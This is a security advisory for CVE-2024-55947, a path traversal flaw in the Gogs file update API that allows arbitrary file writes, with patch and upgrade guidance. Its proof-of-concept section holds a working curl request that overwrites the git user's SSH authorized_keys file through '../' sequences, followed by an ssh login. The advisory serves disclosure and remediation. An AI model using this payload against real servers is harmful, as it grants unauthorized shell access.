# [H] Path Traversal in file update API in gogs

## Summary
Severity: High
Advisory: GHSA-qf5v-rp47-55gg
CVE: CVE-2024-55947
CWE: CWE-22
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-12-23
Source: https://github.com/advisories/GHSA-qf5v-rp47-55gg
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.13.1

## Details
### Impact

The malicious user is able to write a file to an arbitrary path on the server to gain SSH access to the server. 

### Patches

Writing files outside repository Git directory has been prohibited via the repository file update API (https://github.com/gogs/gogs/pull/7859). Users should upgrade to 0.13.1 or the latest 0.14.0+dev.

### Workarounds

No viable workaround available, please only grant access to trusted users to your Gogs instance on affected versions.

### References

n/a

### Proof of Concept

1. Generate a Personal Access Tokens
2. Edit any file on the server with this

    ```bash
    curl -v --path-as-is -X PUT --url "http://localhost:10880/api/v1/repos/Test/bbcc/contents/../../../../../../../../home/git/.ssh/authorized_keys" \
    -H "Authorization: token eaac23cf58fc76bbaecd686ec52cd44d903db9bf" \
    -H "Content-Type: application/json" \
    --data '{
      "message": "an",
      "content": "<base64encoded: your ssh pub key>"
    }'
    ```

3. ssh connect to remote server

    ```bash
    ssh -i temp git@localhost -p 10022
    ```

### For more information
If you have any questions or comments about this advisory, please post on https://github.com/gogs/gogs/issues/7582.

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-qf5v-rp47-55gg
- https://nvd.nist.gov/vuln/detail/CVE-2024-55947
- https://github.com/gogs/gogs/issues/7582
- https://github.com/gogs/gogs/pull/7859
- https://github.com/gogs/gogs/commit/9a9388ace25bd646f5098cb9193d983332c34e41
- https://github.com/gogs/gogs
